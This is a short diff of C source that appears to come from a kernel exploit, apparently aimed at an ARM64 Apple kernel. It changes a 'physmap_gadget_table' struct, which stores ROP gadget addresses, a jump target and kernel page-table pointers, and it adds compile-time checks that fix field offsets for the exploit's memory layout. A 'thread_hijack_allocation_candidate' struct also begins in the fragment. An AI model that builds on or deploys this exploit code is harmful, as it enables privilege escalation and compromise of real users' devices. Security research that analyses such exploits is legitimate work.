@@ -1726,7 +1726,11 @@ ssize_t __cdecl write(int __fd, const void *__buf, size_t __nbyte);
 
 struct physmap_gadget_table
 {
-  uint32_t exceptionReturnWords[11];
+  union
+  {
+    uint32_t exceptionReturnWords[11];
+    uint16_t exceptionReturnHalfwords[22];
+  };
   uint64_t ldrX0Ret;
   uint64_t movX15BrX17;
   uint64_t movX15BrX21;
@@ -1736,13 +1740,17 @@ struct physmap_gadget_table
   uint64_t movX0Ret;
   uint64_t movX0X19Ret;
   uint64_t adrDataRef;
-  uint64_t strDwordPtrRet;
-  uint64_t interruptDisableRet;
   uint64_t jumpTarget;
   uint64_t vmPageArray;
   uint64_t pmapTteTable;
-  uint64_t vmFirstPhysPaddr;
 };
+
+typedef char physmap_gadget_table_ldr_offset_must_be_0x30[
+  __builtin_offsetof(struct physmap_gadget_table, ldrX0Ret) == 0x30 ? 1 : -1];
+typedef char physmap_gadget_table_jump_offset_must_be_0x78[
+  __builtin_offsetof(struct physmap_gadget_table, jumpTarget) == 0x78 ? 1 : -1];
+typedef char physmap_gadget_table_pmap_offset_must_be_0x88[
+  __builtin_offsetof(struct physmap_gadget_table, pmapTteTable) == 0x88 ? 1 : -1];
 
 struct thread_hijack_allocation_candidate
 {
